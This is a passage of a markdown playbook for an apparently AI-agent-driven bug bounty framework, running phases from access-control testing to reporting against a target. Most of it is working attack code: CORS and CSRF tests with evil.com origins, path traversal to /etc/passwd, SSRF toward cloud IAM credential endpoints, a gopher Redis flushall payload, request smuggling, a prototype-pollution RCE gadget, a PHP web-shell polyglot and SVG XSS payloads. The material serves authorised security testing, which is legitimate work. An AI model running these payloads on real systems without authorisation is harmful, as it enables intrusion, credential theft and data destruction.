curl -sk "$TARGET/api/user/profile" \
  -H "Origin: https://evil.com" \
  -D- | grep -i "access-control-allow"

# Null origin test
curl -sk "$TARGET/api/user/profile" \
  -H "Origin: null" \
  -D- | grep -i "access-control-allow"

# Subdomain wildcard test
curl -sk "$TARGET/api/user/profile" \
  -H "Origin: https://evil.$TARGET_DOMAIN" \
  -D- | grep -i "access-control-allow"

# Prefix/suffix bypass
curl -sk "$TARGET/api/user/profile" \
  -H "Origin: https://${TARGET_DOMAIN}.evil.com" \
  -D- | grep -i "access-control-allow"

# Check if credentials are allowed with wildcard
# ACAO: * + ACAC: true = critical misconfiguration
```

### 5.3 CSRF Testing (CSRFAgent)

```bash
# Check for CSRF token presence
curl -sk "$TARGET" | grep -iE "(csrf|_token|authenticity_token|__RequestVerificationToken)"

# Token bypass techniques:
# 1. Remove CSRF token entirely
# 2. Use empty token value
# 3. Use token from different session
# 4. Change POST to GET (method override)
# 5. Change Content-Type to text/plain (bypasses preflight)

# SameSite bypass via top-level navigation
# If SameSite=Lax, GET requests from cross-origin still send cookies

# Content-Type tricks
curl -sk -X POST "$TARGET/api/settings" \
  -H "Content-Type: text/plain" \
  -d '{"email":"attacker@evil.com"}'
```

### 5.4 Path Traversal

```bash
# Path traversal in file endpoints
for payload in \
  "....//....//....//etc/passwd" \
  "..%2f..%2f..%2fetc/passwd" \
  "..%252f..%252f..%252fetc/passwd" \
  "%2e%2e/%2e%2e/%2e%2e/etc/passwd" \
  "....\\....\\....\\windows\\win.ini"; do
  curl -sk "$TARGET/api/files/download?path=$payload" | head -5
done
```

### 5.5 Forced Browsing

```bash
# Access control bypass via direct URL access
PROTECTED_PATHS=(
  "/admin" "/admin/dashboard" "/admin/users" "/admin/settings"
  "/internal" "/debug" "/console" "/phpinfo.php"
  "/api/admin" "/api/internal" "/api/debug"
  "/actuator" "/actuator/env" "/actuator/health"
  "/.env" "/config.json" "/web.config"
)

for path in "${PROTECTED_PATHS[@]}"; do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$path")
  if [[ "$STATUS" =~ ^(200|301|302)$ ]]; then
    echo "ACCESSIBLE: $TARGET$path -> $STATUS"
  fi
done
```

### Phase 5 Gate

| Condition | Threshold | Action if Failed |
|-----------|-----------|------------------|
| IDOR two-account testing done | All object types tested with both accounts | Required |
| CORS tested on all API endpoints | All endpoints checked for origin reflection | Required |
| CSRF tested on state-changing actions | All POST/PUT/DELETE endpoints checked | Required |
| Path traversal tested | All file-handling endpoints tested | Required |
| Access control matrix documented | User roles vs endpoints matrix | Required |

```bash
jq -s 'add' $FINDINGS_DIR/idor-findings.json \
  $FINDINGS_DIR/cors-findings.json \
  $FINDINGS_DIR/csrf-findings.json \
  > $FINDINGS_DIR/phase5-access-control-all.json

bun hunt-orchestrator.ts --target "$TARGET" --phase access_control --status completed \
  --findings "$FINDINGS_DIR/phase5-access-control-all.json"
```

---

## Phase 6: BUSINESS LOGIC TESTING

**Agents:** BusinessLogicAgent, RaceConditionAgent
**Execution:** PARALLEL
**Duration:** 15-20 minutes
**State:** `phase_6_business_logic: pending -> running -> completed`

### Agent Dispatch Table

| Agent | Input | Output | Focus | Timeout |
|-------|-------|--------|-------|---------|
| BusinessLogicAgent | AppProfile, high-value flows | `$FINDINGS_DIR/logic-findings.json` | Price manipulation, workflow bypass, feature abuse | 15 min |
| RaceConditionAgent | AppProfile, state-changing endpoints | `$FINDINGS_DIR/race-findings.json` | TOCTOU, limit bypass, single-packet attack | 15 min |

### Parallel Dispatch

```
Agent({
  description: "BusinessLogicAgent -- Business logic flaw testing",
  prompt: "<BusinessLogicAgent.md> + logic hypothesis from AppProfile",
  name: "logic-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE"
  },
  output: "$FINDINGS_DIR/logic-findings.json"
})

Agent({
  description: "RaceConditionAgent -- Race condition and TOCTOU testing",
  prompt: "Race condition testing: single-packet attack, limit bypass, TOCTOU",
  name: "race-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE"
  },
  output: "$FINDINGS_DIR/race-findings.json"
})
```

### 6.1 Business Logic Testing (BusinessLogicAgent)

**Price Manipulation:**
```bash
# Negative quantity/price
curl -sk -X POST "$TARGET/api/cart/add" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"item_id":"123","quantity":-1,"price":0.01}'

# Currency rounding abuse
curl -sk -X POST "$TARGET/api/payment/charge" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"amount":0.004}'  # Rounds to $0.00?

# Discount code stacking
# Apply same code twice, apply expired codes, apply codes from other users

# Integer overflow on quantity
curl -sk -X POST "$TARGET/api/cart/update" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"quantity":2147483647}'
```

**Workflow Bypass:**
```bash
# Skip steps in multi-step process
# Go directly from step 1 to step 5
# Access payment confirmation without payment
# Complete order without address validation
```

**Feature Abuse:**
- Referral system abuse (self-referral, infinite loop)
- Trial extension (re-register, time manipulation)
- Coupon generation pattern prediction
- Export/import data manipulation

### 6.2 Race Condition Testing (RaceConditionAgent)

```bash
# Single-packet attack (HTTP/2 or HTTP/1.1 last-byte sync)
# Use turbo-intruder or custom script

# Coupon/discount double-apply race
# Send 20 identical requests simultaneously
python3 -c "
import requests, threading

def apply_coupon():
    requests.post('$TARGET/api/cart/coupon',
        cookies={'session': '$SESSION_COOKIE'},
        json={'code': 'DISCOUNT50'})

threads = [threading.Thread(target=apply_coupon) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
"

# Withdrawal/transfer race (double-spend)
# Send parallel transfer requests exceeding balance

# Rate limit bypass via race
# Send burst of requests before rate limiter activates

# File overwrite race (TOCTOU)
# Upload + rename in parallel to bypass extension check
```

### 6.3 Rate Limiting Bypass

```bash
# Header manipulation to bypass rate limits
BYPASS_HEADERS=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Originating-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Remote-Addr: 127.0.0.1"
  "X-Forwarded-Host: 127.0.0.1"
  "True-Client-IP: 127.0.0.1"
)

for header in "${BYPASS_HEADERS[@]}"; do
  for i in $(seq 1 100); do
    curl -sk "$TARGET/api/auth/login" \
      -H "$header" \
      -d '{"username":"test","password":"wrong'$i'"}'
  done
done

# Case variation bypass
# /api/login vs /API/login vs /Api/Login

# HTTP method bypass
# POST /api/login vs PUT /api/login

# Path normalization bypass
# /api/login vs /api/./login vs /api//login vs /api/login/
```

### Phase 6 Gate

| Condition | Threshold | Action if Failed |
|-----------|-----------|------------------|
| All pricing/payment flows tested | Every monetary flow tested for manipulation | Required if e-commerce |
| Workflow bypass attempted | All multi-step flows tested | Required |
| Race conditions tested | All state-changing endpoints tested with parallel requests | Required |
| Rate limiting evaluated | Login + sensitive endpoints tested for bypass | Required |
| Findings documented | Results written to findings directory | Required |

```bash
jq -s 'add' $FINDINGS_DIR/logic-findings.json \
  $FINDINGS_DIR/race-findings.json \
  > $FINDINGS_DIR/phase6-logic-all.json

bun hunt-orchestrator.ts --target "$TARGET" --phase business_logic --status completed \
  --findings "$FINDINGS_DIR/phase6-logic-all.json"
```

---

## Phase 7: ADVANCED ATTACKS

**Agents:** SSRFAgent, CachePoisoningAgent, HTTPSmugglingAgent, PrototypePollutionAgent, SubdomainTakeoverAgent
**Execution:** PARALLEL (all 5 agents run simultaneously)
**Duration:** 20-30 minutes
**State:** `phase_7_advanced: pending -> running -> completed`
**Max Concurrent Agents:** 5

### Agent Dispatch Table

| Agent | Input | Output | Focus | Timeout |
|-------|-------|--------|-------|---------|
| SSRFAgent | AppProfile, webhook/URL endpoints | `$FINDINGS_DIR/ssrf-findings.json` | Cloud metadata, internal services, protocol smuggling | 15 min |
| CachePoisoningAgent | AppProfile, CDN headers | `$FINDINGS_DIR/cache-findings.json` | Unkeyed headers, cache deception, web cache poisoning | 10 min |
| HTTPSmugglingAgent | AppProfile, proxy headers | `$FINDINGS_DIR/smuggling-findings.json` | CL.TE, TE.CL, H2.CL, request smuggling | 10 min |
| PrototypePollutionAgent | AppProfile, JS analysis | `$FINDINGS_DIR/prototype-findings.json` | Client-side gadgets, server-side RCE via merge | 10 min |
| SubdomainTakeoverAgent | Recon data, DNS records | `$FINDINGS_DIR/takeover-findings.json` | Dangling DNS, unclaimed services | 5 min |

### Parallel Dispatch

```
Agent({
  description: "SSRFAgent -- Server-side request forgery testing",
  prompt: "<SSRFAgent.md> + SSRF hypothesis from AppProfile",
  name: "ssrf-hunter",
  run_in_background: true,
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE",
    cloud_provider: "$(jq -r '.tech_stack.cloud' /tmp/app-profile.json)"
  },
  output: "$FINDINGS_DIR/ssrf-findings.json"
})

Agent({
  description: "CachePoisoningAgent -- Web cache poisoning testing",
  prompt: "Cache poisoning: unkeyed headers, cache deception, CDN abuse",
  name: "cache-hunter",
  run_in_background: true,
  inputs: { target: "$TARGET", app_profile: "/tmp/app-profile.json" },
  output: "$FINDINGS_DIR/cache-findings.json"
})

Agent({
  description: "HTTPSmugglingAgent -- HTTP request smuggling testing",
  prompt: "HTTP smuggling: CL.TE, TE.CL, H2.CL desync attacks",
  name: "smuggling-hunter",
  run_in_background: true,
  inputs: { target: "$TARGET", app_profile: "/tmp/app-profile.json" },
  output: "$FINDINGS_DIR/smuggling-findings.json"
})

Agent({
  description: "PrototypePollutionAgent -- Prototype pollution testing",
  prompt: "Prototype pollution: client-side gadgets, server-side RCE via __proto__",
  name: "prototype-hunter",
  run_in_background: true,
  inputs: { target: "$TARGET", app_profile: "/tmp/app-profile.json" },
  output: "$FINDINGS_DIR/prototype-findings.json"
})

Agent({
  description: "SubdomainTakeoverAgent -- Dangling DNS and subdomain takeover",
  prompt: "Subdomain takeover: dangling CNAME, unclaimed cloud services",
  name: "takeover-hunter",
  run_in_background: true,
  inputs: {
    subdomains: "$RECON_DIR/all-subs.txt",
    alive_hosts: "$RECON_DIR/alive-hosts.json"
  },
  output: "$FINDINGS_DIR/takeover-findings.json"
})
```

### 7.1 SSRF Testing (SSRFAgent)

```bash
# Cloud metadata endpoints
METADATA_URLS=(
  "http://169.254.169.254/latest/meta-data/"                    # AWS IMDSv1
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"  # AWS IAM
  "http://metadata.google.internal/computeMetadata/v1/"         # GCP
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"  # Azure
  "http://100.100.100.200/latest/meta-data/"                    # Alibaba
)

# SSRF via URL parameters
for param in url callback webhook redirect proxy fetch import src href link; do
  for meta_url in "${METADATA_URLS[@]}"; do
    curl -sk "$TARGET/api/endpoint?${param}=${meta_url}" \
      -H "Cookie: $SESSION_COOKIE"
  done
done

# SSRF filter bypasses
BYPASS_IPS=(
  "http://0x7f000001/"                    # Hex encoding
  "http://2130706433/"                    # Decimal encoding
  "http://0177.0.0.1/"                    # Octal encoding
  "http://127.1/"                          # Short form
  "http://[::1]/"                          # IPv6 localhost
  "http://127.0.0.1.nip.io/"             # DNS rebinding
  "http://localtest.me/"                   # Points to 127.0.0.1
  "http://spoofed.burpcollaborator.net/"  # DNS rebinding
)

# Protocol smuggling via SSRF
PROTOCOL_PAYLOADS=(
  "gopher://internal:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a"  # Redis
  "dict://internal:6379/info"                                   # Redis info
  "file:///etc/passwd"                                          # Local file
  "ftp://internal:21/"                                          # FTP scan
)

# Internal service port scan via SSRF
for port in 80 443 8080 8443 3000 5000 6379 9200 5432 3306 27017 11211; do
  START=$(date +%s%N)
  curl -sk "$TARGET/api/fetch?url=http://127.0.0.1:$port/" \
    -H "Cookie: $SESSION_COOKIE" -m 3 > /dev/null 2>&1
  END=$(date +%s%N)
  DIFF=$(( (END - START) / 1000000 ))
  echo "Port $port: ${DIFF}ms"
done
```

### 7.2 Cache Poisoning (CachePoisoningAgent)

```bash
# Unkeyed header detection
UNKEYED_HEADERS=(
  "X-Forwarded-Host" "X-Forwarded-Scheme" "X-Forwarded-Proto"
  "X-Original-URL" "X-Rewrite-URL" "X-Host"
  "X-Forwarded-Port" "X-Forwarded-Server"
  "Forwarded" "X-Custom-IP-Authorization"
)

for header in "${UNKEYED_HEADERS[@]}"; do
  RESPONSE=$(curl -sk "$TARGET/" -H "$header: evil.com" -D-)
  if echo "$RESPONSE" | grep -qi "evil.com"; then
    echo "UNKEYED HEADER REFLECTED: $header"
  fi
done

# Web cache deception
# Access victim's authenticated page with cacheable extension
CACHE_EXTENSIONS=(".css" ".js" ".png" ".jpg" ".gif" ".ico" ".svg" ".woff")
for ext in "${CACHE_EXTENSIONS[@]}"; do
  curl -sk "$TARGET/account/profile${ext}" \
    -H "Cookie: $SESSION_COOKIE" -D- | head -20
  # If response contains user data AND cache headers show cached = VULNERABLE
done

# Cache poisoning via fat GET
curl -sk -X GET "$TARGET/" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=<script>alert(1)</script>" -D-
```

### 7.3 HTTP Request Smuggling (HTTPSmugglingAgent)

```bash
# CL.TE detection
printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED' "$TARGET_DOMAIN" \
  | openssl s_client -connect "$TARGET_DOMAIN:443" -quiet 2>/dev/null

# TE.CL detection
printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n' "$TARGET_DOMAIN" \
  | openssl s_client -connect "$TARGET_DOMAIN:443" -quiet 2>/dev/null

# H2.CL smuggling (HTTP/2 downgrade)
# Requires HTTP/2 support, test with h2cSmuggler:
python3 h2csmuggler.py -x "$TARGET" --test

# TE obfuscation variants
TE_OBFUSCATIONS=(
  "Transfer-Encoding: xchunked"
  "Transfer-Encoding : chunked"
  "Transfer-Encoding: chunked\r\nTransfer-Encoding: x"
  "Transfer-Encoding:\tchunked"
  "X: X[\n]Transfer-Encoding: chunked"
  "Transfer-Encoding\n: chunked"
)
```

### 7.4 Prototype Pollution (PrototypePollutionAgent)

```bash
# Server-side prototype pollution via JSON merge
curl -sk -X PUT "$TARGET/api/user/settings" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"__proto__":{"isAdmin":true}}'

curl -sk -X PUT "$TARGET/api/user/settings" \
  -H "Cookie: $SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"constructor":{"prototype":{"isAdmin":true}}}'

# Client-side prototype pollution via URL parameters
# ?__proto__[isAdmin]=true
# ?constructor.prototype.isAdmin=true

# Detect via status code/response change
# Server-side PP to RCE via EJS/Pug/Handlebars gadgets:
# EJS: {"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').exec('id')//"}}
```

### 7.5 Subdomain Takeover (SubdomainTakeoverAgent)

```bash
# Check for dangling CNAME records
while read sub; do
  CNAME=$(dig +short CNAME "$sub")
  if [ -n "$CNAME" ]; then
    # Check if CNAME target is unclaimed
    HTTP_STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "http://$sub" -m 5)
    if [ "$HTTP_STATUS" -eq 0 ] || echo "$CNAME" | grep -qiE \
      "(s3.amazonaws|herokuapp|ghost.io|wordpress.com|tumblr.com|shopify|fastly|pantheon|zendesk|readme.io|surge.sh|bitbucket.io|ghost.org|azure)"; then
      echo "POTENTIAL TAKEOVER: $sub -> $CNAME (HTTP: $HTTP_STATUS)"
    fi
  fi
done < $RECON_DIR/all-subs.txt > $FINDINGS_DIR/takeover-candidates.txt

# Automated check with subjack or nuclei takeover templates
subjack -w $RECON_DIR/all-subs.txt -t 100 -timeout 30 -o $FINDINGS_DIR/subjack-results.txt -ssl 2>/dev/null
nuclei -l $RECON_DIR/all-subs.txt -t takeovers/ -o $FINDINGS_DIR/nuclei-takeovers.txt 2>/dev/null
```

### Phase 7 Gate

| Condition | Threshold | Action if Failed |
|-----------|-----------|------------------|
| SSRF all URL-accepting endpoints tested | Every webhook/fetch/import endpoint | Required |
| Cache poisoning tested | All CDN-fronted pages checked | Required if CDN detected |
| HTTP smuggling tested | Front-end/back-end desync checked | Required if reverse proxy detected |
| Prototype pollution tested | All JSON merge endpoints checked | Required if Node.js detected |
| Subdomain takeover checked | All subdomains with CNAME verified | Required |

```bash
jq -s 'add' $FINDINGS_DIR/ssrf-findings.json \
  $FINDINGS_DIR/cache-findings.json \
  $FINDINGS_DIR/smuggling-findings.json \
  $FINDINGS_DIR/prototype-findings.json \
  $FINDINGS_DIR/takeover-findings.json \
  > $FINDINGS_DIR/phase7-advanced-all.json

bun hunt-orchestrator.ts --target "$TARGET" --phase advanced --status completed \
  --findings "$FINDINGS_DIR/phase7-advanced-all.json"
```

---

## Phase 8: API & PROTOCOL TESTING

**Agents:** GraphQLAgent, WebSocketAgent, APIAgent
**Execution:** PARALLEL (conditional -- only if detected in AppProfile)
**Duration:** 10-20 minutes (skipped if no applicable protocols detected)
**State:** `phase_8_protocols: pending -> running -> completed | skipped`

### Activation Check

```bash
GRAPHQL_DETECTED=$(jq -r '.graphql_detected' /tmp/app-profile.json)
WEBSOCKET_DETECTED=$(jq -r '.websocket_detected' /tmp/app-profile.json)
API_DETECTED=$(jq -r '.api_endpoints | length > 0' /tmp/app-profile.json)

if [ "$GRAPHQL_DETECTED" = "false" ] && [ "$WEBSOCKET_DETECTED" = "false" ] && [ "$API_DETECTED" = "false" ]; then
  bun hunt-orchestrator.ts --target "$TARGET" --phase protocols --status skipped \
    --reason "No GraphQL, WebSocket, or dedicated API endpoints detected"
  # Skip to Phase 9
fi
```

### Agent Dispatch Table

| Agent | Condition | Input | Output | Focus | Timeout |
|-------|-----------|-------|--------|-------|---------|
| GraphQLAgent | `graphql_detected == true` | AppProfile, GraphQL endpoint | `$FINDINGS_DIR/graphql-findings.json` | Introspection, batch, nested DoS, auth bypass | 10 min |
| WebSocketAgent | `websocket_detected == true` | AppProfile, WS endpoint | `$FINDINGS_DIR/websocket-findings.json` | CSWSH, message injection, origin bypass | 10 min |
| APIAgent | `api_endpoints.length > 0` | AppProfile, Swagger spec | `$FINDINGS_DIR/api-findings.json` | BOLA, mass assignment, rate limiting, auth | 15 min |

### 8.1 GraphQL Testing (GraphQLAgent)

```bash
# Introspection query
curl -sk "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' \
  > $ARTIFACTS_DIR/graphql-schema.json

# If introspection disabled, try alternate endpoints
for endpoint in /graphql /graphiql /api/graphql /v1/graphql /playground; do
  curl -sk "${TARGET}${endpoint}" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}' 2>/dev/null | grep -q "data" && \
    echo "GRAPHQL ENDPOINT: ${TARGET}${endpoint}"
done

# Batching attack (bypass rate limiting)
curl -sk "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -H "Cookie: $SESSION_COOKIE" \
  -d '[{"query":"{ user(id:1) { email } }"},{"query":"{ user(id:2) { email } }"},{"query":"{ user(id:3) { email } }"}]'

# Nested query DoS (query depth attack)
curl -sk "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { comments { author { posts { comments { author { name } } } } } } } }"}'

# Field suggestion abuse (even without introspection)
curl -sk "$TARGET/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ usre { id } }"}' | grep -i "did you mean"

# Authorization bypass per field
# Query fields that should require different auth levels
```

### 8.2 WebSocket Testing (WebSocketAgent)

```bash
# Cross-Site WebSocket Hijacking (CSWSH)
# Test if Origin header is validated
python3 -c "
import websocket
ws = websocket.create_connection('wss://$TARGET_DOMAIN/ws',
    origin='https://evil.com',
    cookie='session=$SESSION_COOKIE')
ws.send('{\"action\":\"get_user_data\"}')
print(ws.recv())
ws.close()
"

# Message injection
# Send malformed JSON to trigger errors
# Inject control characters
# Test for command injection in message handlers

# Authentication bypass on WebSocket upgrade
curl -sk -i -N \
  -H "Connection: Upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  "$TARGET/ws"
# If upgrade succeeds without auth cookie = auth bypass
```

### 8.3 REST API Testing (APIAgent)

```bash
# BOLA (Broken Object Level Authorization)
# Test every endpoint with different user IDs
# Similar to IDOR but focused on API patterns

# Mass assignment via extra JSON fields
curl -sk -X POST "$TARGET/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com","role":"admin","credits":999999}'

# API versioning bypass
# /api/v2/users (secured) vs /api/v1/users (legacy, unsecured)
for ver in v1 v2 v3 beta internal legacy; do
  curl -sk "$TARGET/api/$ver/users" \
    -H "Cookie: $SESSION_COOKIE" -o /dev/null -w "$ver: %{http_code}\n"
done

# HTTP method tampering
for method in GET POST PUT PATCH DELETE OPTIONS HEAD TRACE; do
  curl -sk -X "$method" "$TARGET/api/admin/users" \
    -H "Cookie: $SESSION_COOKIE" -o /dev/null -w "$method: %{http_code}\n"
done

# API key scope testing (if API keys are used)
# Test key with excessive permissions
# Test key from one service on another
```

### Phase 8 Gate

| Condition | Threshold | Action if Failed |
|-----------|-----------|------------------|
| GraphQL schema extracted (if GQL present) | Introspection or field enumeration complete | WARN |
| WebSocket auth tested (if WS present) | CSWSH and origin bypass tested | Required |
| API BOLA tested (if API present) | All object endpoints tested cross-user | Required |
| Findings documented | Results written to findings directory | Required |

```bash
jq -s 'add // []' \
  $FINDINGS_DIR/graphql-findings.json \
  $FINDINGS_DIR/websocket-findings.json \
  $FINDINGS_DIR/api-findings.json \
  > $FINDINGS_DIR/phase8-protocols-all.json 2>/dev/null

bun hunt-orchestrator.ts --target "$TARGET" --phase protocols --status completed \
  --findings "$FINDINGS_DIR/phase8-protocols-all.json"
```

---

## Phase 9: FILE & DATA HANDLING

**Agent:** FileUploadAgent
**Duration:** 10-15 minutes (skipped if no upload functionality)
**State:** `phase_9_file_handling: pending -> running -> completed | skipped`

### Activation Check

```bash
UPLOAD_DETECTED=$(jq -r '.file_upload_detected' /tmp/app-profile.json)

if [ "$UPLOAD_DETECTED" = "false" ]; then
  bun hunt-orchestrator.ts --target "$TARGET" --phase file_handling --status skipped \
    --reason "No file upload functionality detected"
  # Skip to Phase 10
fi
```

### Agent Dispatch

```
Agent({
  description: "FileUploadAgent -- File upload bypass and exploitation testing",
  prompt: "<FileUploadAgent.md> + upload hypothesis from AppProfile",
  name: "upload-hunter",
  inputs: {
    target: "$TARGET",
    app_profile: "/tmp/app-profile.json",
    session_cookie: "$SESSION_COOKIE"
  },
  output: "$FINDINGS_DIR/upload-findings.json"
})
```

### 9.1 File Upload Bypass

```bash
UPLOAD_ENDPOINT=$(jq -r '.high_value_flows[] | select(.agents[] == "FileUploadAgent") | .endpoint' /tmp/app-profile.json | head -1)

# Content-Type bypass
for ct in "image/png" "image/gif" "application/octet-stream" "text/plain"; do
  curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
    -H "Cookie: $SESSION_COOKIE" \
    -F "file=@/tmp/shell.php;type=$ct"
done

# Extension bypass
BYPASS_EXTENSIONS=(
  "shell.php" "shell.pHp" "shell.php5" "shell.php7" "shell.phtml"
  "shell.php.jpg" "shell.php%00.jpg" "shell.php;.jpg"
  "shell.php.png" "shell..php" "shell.php."
  "shell.asp" "shell.aspx" "shell.jsp" "shell.jspx"
  "shell.svg" "shell.shtml" "shell.cer"
)

# Magic bytes bypass
# Prepend PNG magic bytes to PHP shell
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > /tmp/polyglot.php.png

# .htaccess upload (Apache)
echo 'AddType application/x-httpd-php .pwn' > /tmp/.htaccess
curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/.htaccess"
```

### 9.2 Path Traversal via Filename

```bash
# Path traversal in filename parameter
curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/test.txt;filename=../../../tmp/pwned.txt"

curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/test.txt;filename=....//....//....//tmp/pwned.txt"
```

### 9.3 Polyglot Files

```bash
# GIFAR (GIF + JAR)
# PDF polyglot with JS execution
# PNG with embedded PHP

# SVG XSS via file upload
cat > /tmp/xss.svg << 'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <text x="0" y="20">SVG XSS</text>
</svg>
SVGEOF

curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
  -H "Cookie: $SESSION_COOKIE" \
  -F "file=@/tmp/xss.svg;type=image/svg+xml"
```

### 9.4 SVG XSS

```bash
# Multiple SVG XSS vectors
SVG_PAYLOADS=(
  '<svg onload="alert(1)">'
  '<svg><script>alert(1)</script></svg>'
  '<svg><image href="javascript:alert(1)"/></svg>'
  '<svg><foreignObject><body onload="alert(1)"/></foreignObject></svg>'
  '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>'
  '<svg><set attributeName="onmouseover" to="alert(1)"/></svg>'
  '<svg><animate onbegin="alert(1)" attributeName="x"/></svg>'
)

for payload in "${SVG_PAYLOADS[@]}"; do
  echo "$payload" > /tmp/svg-test.svg
  curl -sk -X POST "$TARGET$UPLOAD_ENDPOINT" \
    -H "Cookie: $SESSION_COOKIE" \
    -F "file=@/tmp/svg-test.svg;type=image/svg+xml"
done
```

### Phase 9 Gate

| Condition | Threshold | Action if Failed |
|-----------|-----------|------------------|
| All upload endpoints tested | Every file upload feature tested | Required |
| Extension bypass attempted | All relevant bypass extensions tried | Required |
| Path traversal tested | Filename manipulation tested | Required |
| SVG XSS tested | SVG upload with script injection tested | Required if SVG accepted |

```bash
bun hunt-orchestrator.ts --target "$TARGET" --phase file_handling --status completed \
  --findings "$FINDINGS_DIR/upload-findings.json"
```

---

## Phase 10: REPORTING

**Duration:** 5-10 minutes
**State:** `phase_10_report: pending -> running -> completed`

### 10.1 Aggregate All Agent Findings

```bash
# Collect all findings from all phases
jq -s 'add // []' \
  $FINDINGS_DIR/auth-findings.json \
  $FINDINGS_DIR/sqli-findings.json \
  $FINDINGS_DIR/xss-findings.json \
  $FINDINGS_DIR/xxe-findings.json \
  $FINDINGS_DIR/rce-findings.json \
  $FINDINGS_DIR/idor-findings.json \
  $FINDINGS_DIR/cors-findings.json \
  $FINDINGS_DIR/csrf-findings.json \
  $FINDINGS_DIR/logic-findings.json \
  $FINDINGS_DIR/race-findings.json \
  $FINDINGS_DIR/ssrf-findings.json \
  $FINDINGS_DIR/cache-findings.json \
  $FINDINGS_DIR/smuggling-findings.json \
  $FINDINGS_DIR/prototype-findings.json \
  $FINDINGS_DIR/takeover-findings.json \
  $FINDINGS_DIR/graphql-findings.json \
  $FINDINGS_DIR/websocket-findings.json \
  $FINDINGS_DIR/api-findings.json \
  $FINDINGS_DIR/upload-findings.json \
  2>/dev/null > $FINDINGS_DIR/all-findings-raw.json
```

### 10.2 CVSS Scoring Verification

```bash
# Validate CVSS scores against mode thresholds
HUNT_MODE=$(bun hunt-orchestrator.ts --target "$TARGET" --get-mode)

jq --arg mode "$HUNT_MODE" '
  def cvss_threshold:
    if $mode == "bounty" then 8.0
    elif $mode == "pentest" then 4.0
    else 0.0 end;

  [.[] | select(
    .cvss >= cvss_threshold or
    (.description | ascii_downcase | test("authentication bypass|pre-auth rce|account takeover|privilege escalation|stored xss in admin|novel technique|logic flaw|idor on sensitive data"))
  )]
' $FINDINGS_DIR/all-findings-raw.json > $FINDINGS_DIR/all-findings-filtered.json
```

### 10.3 Deduplicate Findings

```bash
# Deduplicate by endpoint + vulnerability type
jq '
  group_by(.endpoint + .type) |
  map(max_by(.cvss)) |
  sort_by(-.cvss)
' $FINDINGS_DIR/all-findings-filtered.json > $FINDINGS_DIR/all-findings-deduped.json

FINDING_COUNT=$(jq 'length' $FINDINGS_DIR/all-findings-deduped.json)
echo "[REPORT] Total unique findings: $FINDING_COUNT"
```

### 10.4 Attack Chain Correlation

```bash
# Identify attack chains from lower-severity findings
jq '
  # Archive medium findings for chain analysis
  [.[] | select(.cvss >= 4.0 and .cvss < 8.0)] as $mediums |

  # Known chain patterns
  {
    "ato_chain": [$mediums[] | select(.type | test("XSS|session|CSRF"; "i"))],
    "data_breach_chain": [$mediums[] | select(.type | test("IDOR|info_disclosure|SSRF"; "i"))],
    "rce_chain": [$mediums[] | select(.type | test("SSRF|file_upload|deserialization"; "i"))],
    "cloud_takeover_chain": [$mediums[] | select(.type | test("SSRF|cloud|metadata"; "i"))]
  } |
  to_entries | map(select(.value | length >= 2)) |
  map({chain_name: .key, findings: .value, combined_impact: "elevated"})
' $FINDINGS_DIR/all-findings-raw.json > $FINDINGS_DIR/attack-chains.json
```

### 10.5 Generate Professional Report

```bash
bun ~/.claude/skills/BugBountyFramework/Tools/generate-report.ts \
  --findings $FINDINGS_DIR/all-findings-deduped.json \
  --chains $FINDINGS_DIR/attack-chains.json \
  --template ~/.claude/skills/BugBountyFramework/Templates/BugReport.md \
  --target "$TARGET" \
  --program "$PROGRAM_NAME" \
